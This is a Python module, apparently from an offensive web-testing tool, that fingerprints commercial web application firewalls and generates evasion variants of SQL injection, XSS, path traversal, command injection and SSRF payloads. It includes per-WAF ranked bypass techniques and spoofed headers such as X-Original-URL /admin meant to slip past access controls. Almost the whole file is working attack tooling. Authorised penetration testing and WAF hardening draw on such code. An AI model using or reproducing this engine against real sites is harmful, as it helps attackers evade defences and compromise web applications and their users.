"""WAF bypass variant engine (Tkinter-free, headless-safe).

Pure logic for generating, scoring and fingerprinting WAF-evasion payload
variants. Extracted from waf_panel.py so it can be reused by the Web GUI and
other headless callers without pulling in the Tkinter desktop UI.
"""
import json
import urllib.parse
import urllib.request
import base64
import random
import requests


def url_encode(s, times=1):
    for _ in range(times): s = urllib.parse.quote(s, safe="")
    return s

def double_url_encode(s):
    return urllib.parse.quote(urllib.parse.quote(s, safe=""), safe="")

def html_entity_encode(s):
    return "".join(f"&#{ord(c)};" for c in s)

def unicode_escape(s):
    return "".join(f"\\u{ord(c):04x}" for c in s)

def utf8_overlong(s):
    return "".join(f"%c0%{ord(c):02x}" if ord(c) < 0x80 else c for c in s)

def mysql_char(s):
    return "CHAR(" + ",".join(str(ord(c)) for c in s) + ")"

def pg_chr(s):
    return "CHR(" + ")||CHR(".join(str(ord(c)) for c in s) + ")"

def mssql_nchar(s):
    return "NCHAR(" + ")+NCHAR(".join(str(ord(c)) for c in s) + ")"

def hex_encode(s):
    return "0x" + s.encode().hex()

def case_randomize(s):
    return "".join(c.upper() if random.random() < 0.5 else c.lower() for c in s)

def with_comments(s):
    out = []
    for cmt in ["/**/", "/*!/", "/*a*/", "-- ", "#", ";", "/*x*/"]:
        out += [s.replace(" ", cmt), cmt + s, s + cmt]
    return out

def null_byte(s):
    return s.replace(" ", "%00")

_HOMO = {'a': '\u0251', 'c': '\u0188', 'e': '\u043d', 'i': '\u0261', 'o': '\u0555', 'p': '\u0584', 's': '\u0455', 'x': '\u0445'}

def homoglyph_swap(s):
    return "".join(_HOMO.get(c.lower(), c) for c in s)

def hpp_variant(s):
    return s + "&" + s

def chunked_variant(s):
    parts = [s[i:i + 2] for i in range(0, len(s), 2)]
    return "\\r\\n".join(f"{len(p):x}" for p in parts) + "\\r\\n0\\r\\n\\r\\n"

def xml_cdata(s):
    return f"<![CDATA[{s}]]>"

def json_key_inject(s):
    return json.dumps({"key": s, "": ""})

def fat_get(s):
    return s + "?" + "A" * 8190

def tab_newline(s):
    return s.replace(" ", random.choice(["\t", "%09", "%0a", "%0d", "/**/"]))

def b64_double_url(s):
    b = base64.b64encode(s.encode()).decode()
    return urllib.parse.quote(urllib.parse.quote(b, safe=""), safe="")

def charset_utf7(s):
    return "+ADw-" + base64.b64encode(s.encode("utf-7")).decode() + "-AD4-"

def charset_utf16le(s):
    return s.encode("utf-16le").hex()

def backslash_path(s):
    return s.replace("/", "\\\\")

def semicolon_inject(s):
    return s.replace("&", ";")

def xml_ns_abuse(s):
    return f'<root xmlns:x="http://xml.org">{s}</root>'

def multipart_boundary(s):
    return f"------WebKitFormBoundary7MA4YWxk\r\nContent-Disposition: form-data; name=\"f\"\r\n\r\n{s}\r\n------WebKitFormBoundary7MA4YWxk--"

CHAIN_OPS = {"url": url_encode, "double_url": double_url_encode,
    "base64": lambda s: base64.b64encode(s.encode()).decode(),
    "html_entity": html_entity_encode, "unicode": unicode_escape, "hex": hex_encode,
    "null_byte": null_byte, "case": case_randomize, "tab": tab_newline,
    "homoglyph": homoglyph_swap, "b64_double_url": b64_double_url,
    "charset_utf7": charset_utf7, "charset_utf16le": charset_utf16le, "backslash": backslash_path}

def apply_chain(payload, chain):
    s = payload
    for op in chain:
        if op in CHAIN_OPS: s = CHAIN_OPS[op](s)
    return s

WAF_SIGS = {
    "Cloudflare": ["cf-ray", "cf-cache-status", "cloudflare", "__cfduid"],
    "Akamai": ["x-akamai-transformed", "akamai", "x-true-cache-key"],
    "AWS WAF": ["x-amzn-waf", "x-amzn-requestid", "awswaf"],
    "ModSecurity": ["mod_security", "modsecurity", "NOYB"],
    "F5 BIG-IP": ["bigip", "bigipdomain", "f5"],
    "Imperva": ["x-iinfo", "incap_ses", "imperva"],
    "Sucuri": ["sucuri", "x-sucuri-id"]}

def fingerprint_waf(url):
    try:
        r = requests.get(url, timeout=10, verify=False, headers=SPOOF_HEADERS)
        hdrs = {k.lower(): v.lower() for k, v in r.headers.items()}
        for waf, sigs in WAF_SIGS.items():
            for sig in sigs:
                if any(sig in k or sig in v for k, v in hdrs.items()):
                    return waf, r
        return "Unknown", r
    except Exception:
        return "Unknown", None

WAF_VARIANT_PRIORITY = {
    "Cloudflare": ["homoglyph", "chunked", "charset_utf7", "tab", "b64_double_url", "xml_cdata"],
    "Akamai": ["fat_get", "hpp", "backslash", "semicolon", "charset_utf16le", "multipart"],
    "AWS WAF": ["xml_ns_abuse", "json_key", "chunked", "b64_double_url", "charset_utf7"],
    "ModSecurity": ["charset_utf7", "homoglyph", "null_byte", "b64_double_url", "tab"],
    "F5 BIG-IP": ["fat_get", "hpp", "backslash", "charset_utf16le", "semicolon"],
    "Imperva": ["chunked", "homoglyph", "charset_utf7", "xml_cdata", "multipart"],
    "Sucuri": ["tab", "b64_double_url", "charset_utf7", "homoglyph", "chunked"]}


def _tech_present(tech, v):
    """Return True if the variant string `v` actually contains the encoded
    signature produced by the named WAF-evasion technique. Matches the real
    output of the encoders in this module."""
    vlow = v.lower()
    if tech == "homoglyph":
        return any(ord(c) > 127 for c in v)
    if tech == "chunked":
        # chunked_variant emits the literal 4-char sequence \r\n (backslash-r-n)
        return "\\r\\n" in v
    if tech == "charset_utf7":
        return "+ad" in vlow or "utf-7" in vlow
    if tech == "tab":
        return "\t" in v or "%09" in vlow or "%0a" in vlow
    if tech == "b64_double_url":
        return "%25" in vlow
    if tech == "xml_cdata":
        return "<![cdata" in vlow
    if tech == "fat_get":
        # fat_get appends "?A...A" (8190 A's)
        return "?" in v and len(v) > 8000
    if tech == "hpp":
        # hpp_variant appends "&" + payload
        return "&" in v
    if tech == "backslash":
        return "\\" in v or "%5c" in vlow
    if tech == "semicolon":
        return ";" in v or "%3b" in vlow
    if tech == "charset_utf16le":
        # utf-16le hex output: even-length all-hex string (excludes "0x..." which
        # contains an 'x')
        return (len(v) > 8 and len(v) % 2 == 0
                and all(c in "0123456789abcdef" for c in vlow))
    if tech == "multipart":
        return "multipart" in vlow
    if tech == "xml_ns_abuse":
        return "xmlns" in vlow
    if tech == "json_key":
        # json_key_inject -> {"key": <payload>, "": ""}
        return '"key"' in vlow and '""' in vlow
    return False


def score_variant(v, waf="Unknown"):
    s = 50
    if len(v) > 200: s -= 10
    if "%0" in v: s += 8
    if "/**/" in v: s += 6
    s += sum(4 for enc in ["%", "&#", "\\", "0x", "+"] if enc in v)
    if waf != "Unknown":
        for i, p in enumerate(WAF_VARIANT_PRIORITY.get(waf, [])):
            if _tech_present(p, v): s += (10 - i) * 3
    if any(c in v for c in ["\t", "\n", "\r"]): s += 5
    if any(x in v for x in ["<![CDATA", "xmlns", "multipart"]): s += 7
    return min(max(s, 0), 100)

def fingerprint_response(resp):
    return {"status": resp.status_code, "length": len(resp.text),
        "headers": {k.lower(): v for k, v in resp.headers.items()},
        "body_sig": resp.text[:200].lower(), "time": resp.elapsed.total_seconds()}

def generate_variants(payload, category):
    v = set()
    v.add(payload)
    v.add(url_encode(payload))
    v.add(double_url_encode(payload))
    v.add(html_entity_encode(payload))
    v.add(unicode_escape(payload))
    v.add(utf8_overlong(payload))
    v.add(base64.b64encode(payload.encode()).decode())
    v.add(hex_encode(payload))
    v.add(case_randomize(payload))
    for x in with_comments(payload): v.add(x)
    v.add(null_byte(payload))
    v.add(homoglyph_swap(payload))
    v.add(hpp_variant(payload))
    v.add(tab_newline(payload))
    v.add(b64_double_url(payload))
    v.add(charset_utf7(payload))
    v.add(charset_utf16le(payload))
    v.add(backslash_path(payload))
    v.add(semicolon_inject(payload))
    v.add(fat_get(payload))
    v.add(chunked_variant(payload))
    v.add(xml_cdata(payload))
    v.add(json_key_inject(payload))
    v.add(multipart_boundary(payload))
    v.add(xml_ns_abuse(payload))
    if category == "SQLi":
        v.add(mysql_char(payload)); v.add(pg_chr(payload)); v.add(mssql_nchar(payload))
        v.add(payload.replace(" ", "/**/")); v.add("/*!*/" + payload); v.add(payload + "-- -")
    if category == "XSS":
        v.add(payload.replace("<", "%3C").replace(">", "%3E"))
        v.add(payload.replace("<", "&lt;").replace(">", "&gt;"))
        v.add("``" + payload); v.add(payload.replace("script", "scr\\x00ipt"))
    if category == "Path Traversal":
        for r, w in [("../", "..\\/"), ("../", "....//"), ("../", "..%2f"), ("../", "..%252f")]:
            v.add(payload.replace(r, w))
        v.add("/" + payload.lstrip("/"))
    if category == "Command Injection":
        v.add(payload.replace(";", "${IFS}")); v.add(payload.replace(";", "%3b"))
        v.add(payload.replace("|", "${IFS}|")); v.add(payload + "${PATH:0:1}id")
    if category == "SSRF":
        for r, w in [("127.0.0.1", "2130706433"), ("127.0.0.1", "0x7f000001"), ("127.0.0.1", "[::1]"), ("localhost", "0")]:
            v.add(payload.replace(r, w))
        v.add("http://[::ffff:127.0.0.1]/")
    return sorted(v)

SPOOF_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "X-Forwarded-For": "127.0.0.1", "X-Original-URL": "/admin", "X-Rewrite-URL": "/admin",
    "X-Custom-IP-Authorization": "127.0.0.1", "X-Forwarded-Host": "internal", "X-Cluster-Client-IP": "127.0.0.1"}
